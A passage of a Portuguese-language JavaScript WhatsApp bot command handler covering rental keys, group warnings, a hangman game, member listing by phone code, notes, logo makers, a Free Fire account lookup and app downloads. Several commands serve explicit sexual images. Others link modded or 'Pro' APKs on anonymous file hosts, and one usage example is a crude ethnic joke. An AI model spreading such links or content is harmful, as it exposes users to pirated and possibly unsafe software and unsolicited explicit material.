if(!SoDono) return enviar(arise.donosmt)
reagir(from, "😀")
cort = 24 
idks = `G${cort}-`
idks += `${Number(from.replace("-", "").slice(2, 8)) * Number(sender.slice(2, 8))}`
idks += `E${Number(cort/2).toFixed(0)}R-${Number(moment.tz('America/Sao_Paulo').format('DDMMYY')) + Number(moment.tz('America/Sao_Paulo').format('HHmmss'))}A`
chaves.push({key: idks, tipo: 2, dias: 24, cliente: sender, valor: 0})//tipo 3 = cortesia
fs.writeFileSync("./banco de dados/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
enviar(`🛒🌟 O código cortesia foi gerado com sucesso! Segue abaixo a chave de ativação do mesmo:\n-> *${idks}*`)
break

case 'delcodegp':
if(!SoDono) return enviar(arise.donosmt)
if(!JSON.stringify(chaves).includes("yatomods")) return enviar(`Não há keys registradas`)
if(!q) return enviar(`Cadê o código de aluguel que você deseja apagar?`)
if(!JSON.stringify(chaves).includes(q)) return enviar("O código não foi encontrado em nosso banco de dados, é inexistente!")
AD = chaves.map(i => i.key).indexOf(q)
chaves.splice(AD, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
enviar(`[!] O código *${q}* foi deletado do sistema com sucesso.`)
break

case 'zerar_votacao': case 'cancel_voting':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!fs.existsSync(`./banco de dados/func/votacao/p_votos/${from}.json`)) return enviar(`Não existe nenhuma arquivo de votação com id do grupo.`)
DeletarVotos(from) /* Deletar os arquivos */
enviar("• Votação resetada / cancelada com sucesso, como foi solicitado!")
break

case 'rm_aviso':
case 'rm_avisos':  
if(!isGroup) return enviar(arise.grupo)  
if(!isGroupAdmins) return enviar(arise.adm)
for ( i of black_) {var RDFA = i}
if(!JSON.stringify(RDFA.PUXAR).includes(from)) return enviar(mess.noWarning)
RDFA.PUXAR.splice(RDFA.PUXAR.indexOf(from))
fs.writeFileSync("./banco de dados/grupos/avisos.json", JSON.stringify(black_, null, 2))
enviar(mess.warningRemoved())
break

case 'rg_aviso':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)  
var [hr, ms] = q.trim().split("|")
if(!q.trim().includes(":") && !q.trim().includes("|")) return enviar(mess.warningSyntax)
var i5 = black_?.map(i => i?.hora)?.indexOf(hr)
if(JSON.stringify(black_[i5]?.PUXAR)?.includes(from)) {
black_[i5].PUXAR.splice(black_[i5].PUXAR.map(i => i.idgp).indexOf(from))
fs.writeFileSync("./banco de dados/grupos/avisos.json", JSON.stringify(black_, null, 2))
setTimeout(() => {
enviar(mess.sucessDeleteWarning)
}, 500)
} else if(!JSON.stringify(black_).includes(hr)) {
black_.push({hora: hr, PUXAR: [{idgp: from, msg: ms, avisou: false}]})
fs.writeFileSync("./banco de dados/grupos/avisos.json", JSON.stringify(black_, null, 2))
enviar(mess.sucessWarning())
} else if(!JSON.stringify(black_[i5].PUXAR).includes(from)) {
black_[i5].PUXAR.push({idgp: from, msg: ms, avisou: false})
fs.writeFileSync("./banco de dados/grupos/avisos.json", JSON.stringify(black_, null, 2))
enviar(mess.sucessWarning())
}
break

case 'iddogrupo':
if(!SoDono) return enviar(arise.donosmt)
enviar(from)
break

//=========== [ ÍNICIO JOGOS ] ========= //

case 'addpalavras_forca':
case 'addpalavras_f':  
if(!SoDono) return enviar(arise.donosmt)
var [ttl, tema, dc] = q.toLowerCase().trim().split("|")
if(!q.includes("|")) return enviar(mess.FormWrong_AddWordsForca1)
if(q.lastIndexOf("|") < 0) return enviar(mess.FormWrong_AddWordsForca2)
kir = []
for (i of palavrasfr) {kir.push(i.plvr)}
if(kir.indexOf(ttl.toLowerCase().trim()) >= 0) return enviar(mess.inUseWords_Forca())
palavrasfr.push({plvr: ttl, tema: tema, dica: dc})
fs.writeFileSync("./banco de dados/grupos/palavras_forca.json", JSON.stringify(palavrasfr, null, 2))
enviar(mess.sucessAddWord_Forca())
break 

case 'rmpalavra_f':
case 'rmpalavra_forca':  
if(!SoDono) return enviar(arise.donosmt) 
var i5 = palavrasfr.map( i => i.plvr).indexOf(q.trim().toLowerCase())
palavrasfr.splice(i5, 1)
fs.writeFileSync("./banco de dados/grupos/palavras_forca.json", JSON.stringify(palavrasfr, null, 2))
enviar(mess.sucessRemWord_Forca())
break

case 'rv-forca': case 'resetforca': 
if(!isGroupAdmins) return enviar(arise.adm)
if(!isGroup) return enviar(arise.grupo)
if(dataGp[0].forca_inc == false) return enviar(mess.gameForcaNotStarted)
rv_forca()
enviar(mess.sucessResetForca)
break
  
case 'mostrar_forca':
case 'ver_forca':  
case 'iniciar_forca':  
case 'jogodaforca':  
if(!isGroup) return enviar(arise.grupo)
try {
if(dataGp[0].forca_inc) return enviar(mess.forcaInProgress)
if(!dataGp[0].forca_inc) {
rv_forca()
var DM_FR = dataGp[0].forca_ofc[0]
dataGp[0].forca_inc = true
setGp(dataGp)
await sleep(300)
linha_fr = " "
for (i of DM_FR.palavra){linha_fr += ` ${i}`}
enviar(mess.forcaStarted(DM_FR, linha_fr)) 
}
} catch (e) {
console.log(e)
}
break

case 'r-forca':
case 'r-f':
if(!isGroup) return enviar(arise.grupo)  
if(!dataGp[0].forca_inc) return enviar(mess.gameForcaNotStarted)
if(!q.toLowerCase().trim()) return enviar("Digite a letra que deseja responder..")
var q2 = q_2.trim().toLowerCase()
if(ANT_LTR_MD_EMJ(q2) || Number(q2)) return enviar("Não pode letras modificadas, nem emoji, nem números..")
if(q.trim().length == 2) return enviar("Digite letra por letra para tentar adivinhar, ou acerte a palavra toda, boa sorte...")
DM_FR = dataGp[0].forca_ofc[0]
if(DM_FR.escreveu.indexOf(q2) >= 0) return enviar("Esta letra já foi utilizada..")
var ERRQ = DM_FR.palavra_ofc.includes(q2) ? 0 : 1
var ERROS = dataGp[0].forca_ofc[0].erros
DM_FR.escreveu.push(q2); setGp(dataGp)
PSC = [] 
if(DM_FR.palavra_ofc.indexOf(q2) >= 0) {
for (i = 0; i < DM_FR.palavra_ofc.length; i++) {
if(DM_FR.palavra_ofc[i] == q2) {
PSC.push(i)
DM_FR.acertos += 1
}}
setGp(dataGp)
for ( i of PSC){
DM_FR.palavra[i] = q2; setGp(dataGp)}
}
await sleep(300)
linha_fr = " "
for ( i of DM_FR.palavra){linha_fr += ` ${i}`}
letra_ut = " "
for ( i of DM_FR.escreveu){letra_ut += `${i}, `}
if(q.length > 2) {enviar("Humm, espertinho quer acertar a palavra toda")}
await sleep(500)
if(DM_FR.palavra_ofc.indexOf(q2) >= 0 || q2.length > 2 && q2 == DM_FR.palavra_ofc) {
enviar(`${q2.length > 2 ? `Você acertou a palavra toda e ganhou bom menino(a), irei resetar o jogo...` : DM_FR.acertos == DM_FR.palavra_ofc.length ? `Parabéns, toda palavra foi concluída : < ${DM_FR.palavra_ofc} > irei resetar o jogo..`:`Você acertou uma letra e ganhou continue assim..`}`)
if(q2.length > 2 || DM_FR.acertos == DM_FR.palavra_ofc.length){return rv_forca()}
await sleep(200)
enviar(mess.forcaStartedRespond(DM_FR, ERROS, ERRQ, linha_fr, letra_ut))
} else {
enviar(`${q2.length > 2 ? `Infelizmente você perdeu, errou a palavra toda, deveria ter tentado letra por letra né, irei resetar o jogo..` :ERROS+ERRQ == 6 ? `Aa, você completou 6 Erros, e perdeu irei resetar o jogo..` : `Você Errou, e perdeu 😥..`}`)
dataGp[0].forca_ofc[0].erros += 1
setGp(dataGp)
if(q2.length > 2 || ERROS+ERRQ == 6){return rv_forca()}
await sleep(200)
enviar(RST_T)
}
break

case 'quando':  
if (!q) return enviar('Digite a pergunta!')
const meupirul = ['Hoje', 'Amanhã', 'Nunca', 'dia', 'semana', 'mês', 'ano']
const meupirul2 = ['dias', 'semanas', 'meses', 'anos']
randomm = meupirul[Math.floor(Math.random() * meupirul.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (randomm == 'Hoje' || randomm == 'Amanhã' || randomm == 'Nunca') {
texto = `Pergunta: ${body.slice(1)}\nResposta: ${randomm}`
} else if (random2 == 1) {
texto = `Pergunta: ${body.slice(1)}\nResposta:  1 ${randomm}`
} else {
random3 = meupirul2[Math.floor(Math.random() * meupirul2.length)]
texto = `Pergunta: ${body.slice(1)}\nResposta: ${random2} ${random3}`
}
enviar(texto)
break

//=========== [ FINAL JOGOS ] ========= //

case 'listaddi': case 'ddilist':
if(!isGroup) return enviar(arise.grupo);
if(!isGroupAdmins) return enviar(arise.adm);
if(q.length < 1) return enviar(`🔹 Uso correto: *${prefix}listaddi 55*`)
if(isNaN(q))return enviar(`Fale o código de um país, por exemplo: *${prefix}listaddi 55*`)
teks = `• Número com código de país +${args[0]} registrados no grupo:\n–\n`
men = []
for(let mem of groupMembers) {
if(mem.id.startsWith(q)) {
teks += `⇒ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
}
}
if(teks.indexOf('⇒') < 0) return enviar(`Nenhum número com o ddi *+${args[0]}* foi encontrado.`)
safeSendMessage(from, {text: teks, mentions: men}, {quoted: non}).catch((error) => {
   enviar(mess.error())
})
break

case 'listabr': case 'brlist':
if(!isGroup) return enviar(arise.grupo);
if(!isGroupAdmins) return enviar(arise.adm);
teks = `[Total: *${groupMembers.length}*] Lista de números brasileiros presentes neste grupo:\n–\n`
men = []
for (let mem of groupMembers) {
if(mem.id.startsWith(55)) {
teks += `⇒ @${mem.id.split('@')[0]}\n`
men.push(mem.id);
}
}
if(teks.indexOf('⇒') < 0) return enviar('Nenhum número brasileiro foi encontrado no grupo.')
safeSendMessage(from, {text: teks, mentions: men}, {quoted: non}).catch((error) => {
   enviar(mess.error())
})
break

case 'listaddd': case 'dddlist':
if(!isGroup) return enviar(arise.grupo);
if(!isGroupAdmins) return enviar(arise.adm);
if(q.length < 1) return enviar(`Fale o código do estado, por exemplo: *${prefix}listaddd 82*`)
if(isNaN(q))return enviar(`Fale o código de um estado(ddd), por exemplo: *${prefix}listaddd 82*`)
teks = `• Lista de números brasileiros com o DDD *${q}* presentes neste grupo:\n–\n`
men = []
for (let mem of groupMembers) {
if(mem.id.startsWith(55+q)) {
teks += `⇒ @${mem.id.split('@')[0]}\n`
men.push(mem.id);
}
}
if(teks.indexOf('⇒') < 0) return enviar('Nenhum *número brasileiro* com ddd fornecido foi encontrado no grupo.')
safeSendMessage(from, {text: teks, mentions: men}, {quoted: non}).catch((error) => {
   enviar(mess.error())
})
break

case 'limpar_mortos-cnt':
if(!SoDono) return enviar(arise.donosmt)
if(!isGroup) return enviar(arise.donosmt)
bla = [] 
var CNT_RS = countMessage[countMessage.map(i => i.groupId).indexOf(from)].numbers
for ( i = 0; i < CNT_RS.map( i => i.id).length; i++) { bla.push(CNT_RS.map( i => i.id)[i])};
for ( i of groupMembers) {bla.splice(bla.indexOf(i.id), 1)};
for ( i of bla) {CNT_RS.splice(CNT_RS.indexOf(i), 1)};
fs.writeFileSync("./dono/media/countmsg.json", JSON.stringify(countMessage))
enviar("Usuários que já foi removido, ou saiu do grupo, foi tirado do contador de mensagens..")
break

case 'tirar_docnt':
if(!SoDono) return
if(!isGroup) return enviar(arise.donosmt)
var i2 = countMessage.map(i => i.groupId).indexOf(from) 
var i = countMessage[i2].numbers.map(i => i.id).indexOf(q.trim()+"@s.whatsapp.net")  
countMessage[i2].numbers.splice(i,1)
fs.writeFileSync("./dono/media/countmsg.json", JSON.stringify(countMessage))
enviar("Usuário tirado do contador de mensagens com sucesso...")
break

case 'anotar':
case 'tirar_nota':
case 'rmnota':
if(!isGroup) return enviar(`Só em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return enviar(arise.adm)
if(command == "anotar") {
var [q5, q10] = q.trim().split("|")
if(!q5 || !q10 || !q.includes("|")) return enviar(`🔹 Uso correto: anotar Cachorro|Cachorros são bom pra comer na Venezuela...`)
if(JSON.stringify(anotar).includes(from)) {  
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(JSON.stringify(anotar[i2].puxar).includes(q5)) {
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q5)  
if(anotar[i2].puxar[i3].nota == q5) return enviar(`Esta anotação já está inclusa, utilize outro título.. Ou você pode tirar com\ntirar_nota ${q5}`)
}
}
if(!JSON.stringify(anotar).includes(from)) {
anotar.push({grupo: from, puxar: [{nota: q5, anotacao: q10}]})
fs.writeFileSync("./banco de dados/func/anotar.json", JSON.stringify(anotar))
enviar("Anotação registrada com sucesso...")
} else {
anotar[i2].puxar.push({nota: q5, anotacao: q10})
fs.writeFileSync("./banco de dados/func/anotar.json", JSON.stringify(anotar))
enviar("Anotação registrada com sucesso...")  
}
} else {
if(!q) return enviar("Digite qual anotação deseja tirar pelo título..")
if(JSON.stringify(anotar).includes(from)) {  
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(JSON.stringify(anotar[i2].puxar).includes(q)) {
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q)  
}
}
if(0 > anotar[i2].puxar.map(i => i.nota).indexOf(q)) return enviar("Esta nota não está inclusa, verifique com atenção...")
anotar[i2].puxar.splice(i3, 1)
fs.writeFileSync("./banco de dados/func/anotar.json", JSON.stringify(anotar))
enviar(`Anotação ${q} tirada com sucesso...`)
}
break

case 'anotacao':
case 'anotacoes':  
case 'nota':
case 'notas':
if(!isGroup) return enviar(`Só em grupo pode utilizar este comando.`)
if(command == "anotacao" || command == "nota") {
if(!q) return enviar("Digite o título da anotação que deseja puxar..")
if(!JSON.stringify(anotar).includes(from)) return enviar("Este grupo não tem nenhuma anotação...")
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(!JSON.stringify(anotar[i2].puxar).includes(q)) return enviar("Não contém nenhuma anotação com este título.")
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q)  
mentions(`〈 ${anotar[i2].puxar[i3].anotacao} 〉`)
} else {
var i2 = anotar.map(i => i.grupo).indexOf(from)    
if(anotar[i2].puxar.length == 0) return enviar("Este grupo não tem nenhuma anotação...")    
var i2 = anotar.map(i => i.grupo).indexOf(from) 
var antr = anotar[i2].puxar 
txtin = `Aqui está todas as anotações registradas em minha database do grupo: *[ ${groupName} ]*\n`
for ( i = 0; i < antr.length; i++) {
txtin += `\n↝ Anotação: ⟮ ${anotar[i2].puxar[i].nota} ⟯ - 〈 ${anotar[i2].puxar[i].anotacao} 〉\n`
}
txtin += ""
mentions(txtin)
}
break

case 'downloads':
case 'download':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.download(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}brincadeira`,
buttonText: { displayText: '「 🤡 」𝐙𝐎𝐄𝐈𝐑𝐀𝐒「 🤡 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
break

case 'metadinha': {
reagir(from, "😍")
try {
ABC = await fetchJson(`https://zero-two-apis.com.br/random/metadinha?apikey=`+KEY_ZERO);
safeSendMessage(from, {image: {url: ABC.masculina}, caption: `♂️ *HOMEM* ♂️`}, {quoted: non})
safeSendMessage(from, {image: {url: ABC.feminina}, caption: `♀️ *MULHER* ♀️`}, {quoted: non})
} catch (e) {
reagir(from, "❌️");
}
}
break;

case 'menulogos':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.logos(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menuapps`,
buttonText: { displayText: '「 📱 」𝐌𝐄𝐍𝐔𝐀𝐏𝐏「 📱 」' },
type: 1
},
{
buttonId: `${prefix}downloads`,
buttonText: { displayText: '「 🗂 」𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃「 🗂 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non})
break

case 'angelwing':  case 'hackneon': case 'fpsmascote': 
case 'equipemascote': case 'txtquadrinhos': case 'ffavatar':
case 'mascotegame': case 'angelglx': case 'gizquadro': 
case 'wingeffect': case 'blackpink': case 'girlmascote': case 'logogame':
try {
if(!q.trim()) return enviar(`Digite algo, Exemplo: ${prefix+command} Zeno`);
reagir(from, "✅");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_EPH?texto=${q}&category=${command}&apikey=${KEY_BRONXYS}`);
safeSendMessage(from, {image: {url: ABC.resultado}}, {quoted: non}).catch(() => {
reagir(from, "❌️");
})
} catch (e) {
return enviar("Erro...");
}
break;

case 'shadow': case 'cup': case 'txtborboleta':
case 'cemiterio': case 'efeitoneon': case 'harryp':
case 'lobometal': case 'neon2': case 'madeira': case 'lovemsg3':
case 'coffecup': case 'coffecup2': case 'florwooden':
case 'narutologo': case 'fire': case 'romantic': case 'smoke':  
case 'papel': case 'lovemsg': case 'lovemsg2':
try {
if(!q.trim()) return enviar(`Digite algo, Exemplo: ${prefix+command} bronxys`);
reagir(from, "✅");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_PHT?texto=${q}&category=${command}&apikey=${KEY_BRONXYS}`);
safeSendMessage(from, {image: {url: ABC.resultado.imageUrl}}, {quoted: non}).catch(() => {
reagir(from, "❌️");
})
} catch (e) {
return enviar("Erro...");
}
break;

case 'fiction': case '3dstone': case 'areia': case 'style': 
case 'blood': case 'pink': case 'cattxt': case 'neondevil':
case 'carbon': case 'metalfire': case 'thunder': case 'vidro': 
case 'jokerlogo': case 'transformer': case 'demonfire':
case 'jeans': case 'metalblue': case 'natal': case 'ossos':
case 'asfalto': case 'break': case 'glitch2': case 'colaq':
case 'neon3': case 'nuvem': case 'horror': case 'matrix':
case 'berry': case 'luxury': case 'thunderv2':
case 'neongreen': case 'neve': case 'neon': case 'neon1':  
case 'neon3d': case 'gelo': case 'neon3': case '3dgold':
case 'lapis': case 'toxic': case 'demongreen': case 'rainbow':
case 'halloween':
try {
if(!q.trim()) return enviar(`Digite algo, Exemplo: ${prefix+command} Zeno`);
reagir(from, "✅");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos?texto=${q}&category=${command}&apikey=${KEY_BRONXYS}`);
safeSendMessage(from, {image: {url: ABC.resultado}}, {quoted: non});
} catch (e) {
reagir(from, "❌️");
}
break;

case 'hentai-ero':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/ass?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentai-ero`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'hentai-ass':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/cuckold?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentai-ass`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'hentaizin':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/gangbang?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentaizin`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'hentai-milf':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/yuri?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentai-milf`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'hentai-oral':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/orgy?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentai-oral`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'hentai-izuri':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/gangbang?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentai-izuri`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'hentai-chi':
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
reagir(from, "😈");
try {
safeSendMessage(from, {image: {url: `https://zero-two-apis.com.br/nsfw/cuckold?apikey=${KEY_ZERO}`}, caption: `🤤 Seu hentaizin 🥵`, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}hentai-chi`,
buttonText: { displayText: '「 ⏭️ 」𝐏𝐑𝐎𝐗𝐈𝐌𝐎「 ⏭️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true}, {quoted: non})
} catch (e) {
enviar(`Deu error ou bug.`)
reagir(from, "❌️");
console.log(e)}
break

case 'menuhentai':
reagir(from, "😈");
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.hentai(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
},
{
buttonId: `${prefix}menuapps`,
buttonText: { displayText: '「 📱 」𝐌𝐄𝐍𝐔𝐀𝐏𝐏「 📱 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non})
break

case 'termux':
reagir(from, "✅");
app = `🆔 *Nome do app:* Termux\n-\n⚙️ *Versão:* 0.119.0-beta.3\n-\n🔗 *Link:* https://f-droid.org/repo/com.termux_1022.apk`;
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/3gqykv.jpg'}, caption: app}, {quoted: non});
break

case 'mt-manager':
reagir(from, "✅");
app = `🆔 *Nome do app:* MT Manager\n-\n⚙️ *Versão:* 2.18.3\n-\n🔗 *Link:* https://files.catbox.moe/6qjviv.apk`;
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/zwvkoq.png'}, caption: app}, {quoted: non});
break

case 'acode':
reagir(from, "✅");
app = `🆔 *Nome do app:* Acode\n-\n⚙️ *Versão:* 1.11.2 (958)\n-\n🔗 *Link:* https://f-droid.org/repo/com.foxdebug.acode_958.apk`
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/8umquu.jpg'}, caption: app}, {quoted: non});
break

case 'zarchiver':
reagir(from, "✅");
app = `🆔 *Nome do app:* ZArchiver\n-\n⚙️ *Versão:* 1.0.10\n-\n🔗 *Link:* https://files.catbox.moe/24zmqp.apk`;
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/e06xo9.jpg'}, caption: app}, {quoted: non});
break

case 'alight-motion':
reagir(from, "✅");
app = `🆔 *Nome do app:* Alight Motion\n-\n⚙️ *Versão:* 5.0.280\n-\n🔗 *Link:* https://alightapp.pro/Alightapp.pro_v5.0.280.apk`
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/1cd6ij.png'}, caption: app}, {quoted: non});
break

case 'pinterest-pro':
reagir(from, "✅");
app = `🆔 *Nome do app:* Pinterest Pro\n-\n⚙️ *Versão:* 11.17.0\n-\n🔗 *Link:* https://www.mediafire.com/file/5zy4qlmmqab5vlm/Pinterest-11.17.0-APKGara.Com.apk/file`
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/zd4rpb.jpg'}, caption: app}, {quoted: non});
break

case 'pixellab':
reagir(from, "✅");
app = `🆔 *Nome do app:* PixelLab Mod\n-\n⚙️ *Versão:* v.2.1.3\n-\n🔗 *Link:* https://files.catbox.moe/h7n7ig.apk`;
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/6ztjj3.png'}, caption: app}, {quoted: non});
break

case 'ps-touch':
reagir(from, "✅");
app = `🆔 *Nome do app:* Ps Touch Plus\n-\n⚙️ *Versão:* tem 3 versoes\n-\n🔗 *Link:* https://www.mediafire.com/file/5707d8lzi2vru65/Ps+Touch+%28vers%C3%B5es%29.zip/file?dkey=s4gt3dxnz9k&r=1726`;
safeSendMessage(from, {image: {url: 'https://files.catbox.moe/wmxzn0.jpg'}, caption: app}, {quoted: non});
break

case 'menuapps':
await escrever()
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ftmenu.logo}, caption: linguagem.apps(NomeDoBot, sender, prefix, hora, isChVip), footer: `${NomeDoBot}`, buttons: [
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
},
{
buttonId: `${prefix}menuadm`,
buttonText: { displayText: '「 ⚙️ 」𝐌𝐄𝐍𝐔𝐀𝐃𝐌「 ⚙️ 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non})
break

case 'ffdata': {
if (!q) return enviar(`❗ Use: *${prefix + command} 198907123*\n🔎 Consulta a data de criação de uma conta Free Fire.`);
if (isNaN(q) || q.length < 9 || q.length > 12) {
return enviar(`⚠️ O ID deve conter entre *9 e 12 dígitos numéricos* válidos.`);
}

try {
const res = await fetchJson(`https://zero-two-apis.com.br/api/get/ff-data-criacao?id=${q}&apikey=${KEY_ZERO}`);
    
if (!res.status || !res.resultados) {
return enviar(`❌ Não foi possível localizar os dados da conta.\nVerifique se o ID está correto.`);
}
reagir(from, '✅');
const { id, nome, data_criacao, raridade, status_conta } = res.resultados;

const texto = `👤 *Informações Free Fire:*\n\n` +
    `🆔 ID: *${id}*\n` +
    `📛 Nome: *${nome || "Não informado"}*\n` +
    `📆 Criada em: *${data_criacao.split('às')[0].trim()}*\n` +
    `🧭 ${data_criacao.split('às')[1].trim()}\n\n` +
    `📊 Raridade: *${raridade}*\n` +
    `🏆 Status: *${status_conta}*`;

await safeSendMessage(from, { image: { url: 'https://qu.ax/eRUFw.jpg' }, caption: texto}, {quoted: non});
} catch (e) {
console.error(e);
enviar(`❌ Erro ao consultar a conta.\nTente novamente mais tarde.`);
reagir(from, '❌');
}
}
break;

case 'ffstalk': {
const id = args[0]
